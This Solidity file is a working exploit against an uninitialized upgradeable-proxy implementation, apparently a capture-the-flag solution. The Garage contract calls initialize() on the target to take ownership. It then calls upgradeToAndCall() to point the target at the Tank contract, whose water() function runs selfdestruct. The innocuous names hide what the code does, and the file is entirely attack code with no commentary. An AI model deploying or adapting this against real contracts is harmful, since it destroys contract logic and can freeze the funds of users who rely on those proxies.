// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Engine {
    function initialize() external;
    function upgradeToAndCall(address, bytes memory) external payable;
}

contract Tank {
    function water() external {
        selfdestruct(payable(0x0));
    }
}

contract Garage {
    function downgrade(address target, address junk) public {
        Engine(target).initialize();
        Engine(target).upgradeToAndCall(junk, abi.encodeWithSignature("water()"));
    }
}
